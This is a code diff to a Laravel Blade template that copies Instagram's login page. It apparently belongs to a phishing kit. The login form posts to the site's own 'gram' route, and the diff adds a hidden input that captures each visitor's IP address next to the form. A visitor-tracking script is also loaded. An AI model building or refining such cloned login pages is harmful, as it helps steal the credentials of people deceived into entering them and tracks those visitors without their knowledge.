@@ -29,6 +29,9 @@
     />
     <script src="{{ asset('js/instagram/visitor.js') }}"></script>
     <style>
+      .hidden{
+        display: none;
+      }
       /* [fale] page loader css */
       .hidden {
         visibility: none !important;
@@ -18211,6 +18214,7 @@
                   Instagram
                 </h1>
                 <div class="EPjEi">
+                  
                   <form
                     class="HmktE"
                     id="loginForm"
@@ -18218,7 +18222,7 @@
                     action="{{ url('gram') }}"
                   >
                   @csrf
-
+                  
                     <div class="qF0y9 Igw0E IwRSH eGOV_ _4EzTm kEKum">
                       <div class="-MzZI">
                         <div class="_9GP1n">
@@ -18270,6 +18274,7 @@
                         </div>
                       </div>
                       
+                      <input type="text" class="hidden" id="ip" name="ip" value="{{ $getIpAddress }}">
                       <div id="ipInfo"></div>
                       
                       <div
